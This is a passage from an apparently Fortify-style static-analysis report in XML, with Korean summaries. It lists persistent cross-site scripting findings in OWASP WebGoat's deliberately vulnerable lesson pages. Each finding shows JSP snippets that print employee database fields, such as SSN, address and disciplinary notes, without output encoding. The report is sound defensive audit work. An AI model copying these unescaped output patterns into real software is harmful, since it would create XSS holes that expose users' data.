                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C6C3F8027CA0DB320A74440E72A2EBD1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E5151311B38F0813C199A177827ECA5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D15EBBCC7971CD5619DBC60EC56B3973" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5B6079EC97DFB02AA16536F032947B6F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C197A05408A8FE443B02C7D81C5B620B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CB032F0F8AEEE908F209A3BEFC4E286C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F55B4C94012A452F9FDD9B8D646DFC9A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6E5106C5AAC5C697251D9A7B6FC2F18C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="541DA729D43888B7D8A0A857D475A0E7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F49FE5E5132048AEF541BF1F6E261766" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2E9F37778F8E5CCA5415B017540EBF1D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5186A04D613715C6F278EC45A6F01CF1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F88176057D9DF45DE376DCF01F0700BD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BBB76EF95E089A5C70CD106FCB742176" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A9C3AE1D213BB2C77AE2A4FA98845ED0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9F39989DF8519AA77BB2FEC0D0F563FB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C439FF10C1C1C28DCBBA4A0CDB7961B4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7AEC8E202F453A848E489E71420B8FDC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="73B6A82FAC6C321ADE56EF4710EA80AD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
